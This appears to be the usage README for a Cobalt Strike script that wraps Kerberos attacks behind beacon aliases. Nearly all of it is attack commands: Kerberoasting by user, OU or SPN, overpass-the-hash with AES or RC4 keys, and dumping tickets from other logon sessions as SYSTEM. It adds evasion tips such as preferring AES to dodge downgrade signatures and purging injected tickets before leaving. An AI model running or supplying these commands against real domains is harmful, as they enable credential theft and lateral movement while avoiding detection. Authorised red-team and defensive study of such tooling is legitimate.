# Usage examples

### 1) Loading

    Cobalt Strike → Script Manager → Load → kerb_ops_inproc.cna
    
Console should print:

    #   [kerb_ops] In-process wrapper loaded. Backend: IEA (Edit the top of the .cna then reload: $KERB_BACKEND = "BOFNET";   # was "IEA")
    #   [kerb_ops] Aliases: roast, opth, ptt, kdump, kpurge

## kerb_inproc.cna

### 1) Kerberoasting

Targeted single account (quietest — preferred)

    beacon> roast /user:svc_sql

Bare username (wrapper auto-adds /user:)

    beacon> roast svc_sql

Whole OU

    beacon> roast /ou:OU=ServiceAccounts,DC=contoso,DC=local

Specific SPN

    beacon> roast /spn:MSSQLSvc/sql01.contoso.local:1433

No argument = /rc4opsec sweep (skips AES-capable accounts)

    beacon> roast

### 2) Overpass-the-Hash

AES256 (preferred — no etype downgrade warning)

    beacon> opth svc_sql contoso.local 5e3d9...aes256keyhex...

RC4 / NT hash (works but warns: "RC4 etype downgrade — top OPtH signature")

    beacon> opth svc_sql contoso.local rc4=8846f7eaee8fb117ad06bdd830b7586c

With extra Rubeus flags passed through (e.g. specify a DC)

    beacon> opth svc_sql contoso.local 5e3d9...key... /dc:dc01.contoso.local

### 3) Triage + dump tickets

Triage all sessions, then dump (needs SYSTEM to see other sessions)

    beacon> kdump

Dump a specific logon session by LUID

    beacon> kdump /luid:0x3e7

If not elevated you'll see:

#### [kerb_ops] Not elevated — cross-session dump needs SYSTEM; you'll only see your own tickets.

### 4) Cleanup

Clear tickets you injected (run this before disengaging)

    beacon> kpurge
